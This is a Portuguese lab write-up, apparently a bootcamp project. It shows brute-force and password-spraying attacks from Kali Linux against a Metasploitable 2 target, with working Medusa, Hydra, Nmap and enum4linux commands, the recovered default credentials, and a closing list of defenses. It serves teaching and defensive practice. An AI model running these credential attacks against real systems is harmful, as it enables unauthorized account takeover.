Ataque de Força Bruta com Medusa e Kali Linux
Projeto prático do bootcamp de Cibersegurança - DIO.
Simulação de ataques de força bruta em ambiente controlado com Kali Linux + Metasploitable 2.

>> ⚠️ Atenção: Todos os testes foram feitos em laboratório próprio, em rede isolada. Não execute em redes ou sistemas sem autorização. <<

1. Ambiente
Atacante: Kali Linux
Alvo: Metasploitable 2
Rede: Rede interna / host-only - mesma rede
IP do alvo: 10.0.9.15 (hostname: metasploitable)
Ferramentas: Nmap, Medusa, Hydra, Enum4linux
2. Wordlists utilizadas
Criei wordlists simples para o lab:

users.txt

msfadmin
user
postgres
root
admin
passwords.txt

msfadmin
password
123456
admin
postgres
user
Local: ~/lab/users.txt e ~/lab/passwords.txt

3. Reconhecimento com Nmap
nmap -sV metasploitable
Resultado:

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
Atenção importante: O FTP não está na porta padrão 21, está na 2121. Por isso nos comandos do Medusa foi necessário usar -n 2121. Sem isso o ataque não encontraria o serviço.

4. Teste 1 - Força Bruta em FTP com Medusa
medusa -h metasploitable -n 2121 -U ~/lab/users.txt -P ~/lab/passwords.txt -M ftp -v 6
Resultado - 3 acessos encontrados:

ACCOUNT FOUND: [ftp] Host: metasploitable User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [ftp] Host: metasploitable User: user Password: user [SUCCESS]
ACCOUNT FOUND: [ftp] Host: metasploitable User: postgres Password: postgres [SUCCESS]
O que isso prova: Senhas fracas, iguais ao nome do usuário.

5. Teste 2 - Força Bruta em Formulário Web (DVWA) com Hydra
Para formulário web usei o Hydra, pois o Medusa não é ideal para HTTP POST form. O desafio permite adaptar a ferramenta.

hydra -L ~/lab/users.txt -P ~/lab/passwords.txt metasploitable http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
Resultado - 1 acesso encontrado:

[80][http-post-form] host: metasploitable   login: admin   password: password
1 valid password found
O que isso prova: O DVWA estava com credencial padrão admin / password.

6. Teste 3 - Enumeração de Usuários SMB com Enum4linux
enum4linux -U metasploitable
Resultado:

Conseguiu listar 35 usuários sem precisar de senha, usando sessão nula (username '' / password '')
Workgroup: WORKGROUP
Usuários importantes encontrados: msfadmin, user, postgres, root, service
O que isso prova: O SMB permitia enumeração anônima.

7. Teste 4 - Password Spraying em SMB com Medusa
Password spraying é diferente de força bruta: testa 1 senha só contra vários usuários.

medusa -h metasploitable -U ~/lab/users.txt -p msfadmin -M smbnt -v 6
Resultado - 1 acesso encontrado:

ACCOUNT FOUND: [smbnt] Host: metasploitable User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
Os outros 4 usuários falharam com essa senha.

O que isso prova: Com uma única senha fraca, consegui acesso administrativo ao SMB (ADMIN$).

8. Validação
Validei os acessos encontrados:

FTP: login com msfadmin / msfadmin funcionou
DVWA: login com admin / password funcionou
SMB: login com msfadmin / msfadmin funcionou com acesso ADMIN$
9. Mitigação / Como se Defender
Nunca usar senha igual ao usuário e trocar todas as senhas padrão
Senhas fortes + MFA onde for possível
Bloquear sessão nula no SMB e desativar enumeração anônima de usuários
Fail2ban / bloqueio por tentativas para travar força bruta no FTP, SSH e Web
Desativar FTP e usar SFTP/FTPS, ou pelo menos não expor na rede
Trocar porta padrão não é segurança, o importante é o controle de acesso
Monitorar logs de tentativas de login falhas em sequência
Desativar contas desnecessárias se não forem usadas
10. O que aprendi
Diferença entre força bruta (muitas senhas em 1 usuário) e password spraying (1 senha em muitos usuários)
Como identificar portas e serviços com Nmap antes de atacar
Como o FTP na porta 2121 muda o comando e por que sempre checar a porta real
Como o SMB permite enumeração sem autenticação se estiver mal configurado
Como documentar um teste de forma que outra pessoa consiga reproduzir
11. Arquivos do projeto

/README.md
/users.txt
/passwords.txt
/images/
12. Prints
Prints dos testes estão na pasta /images.
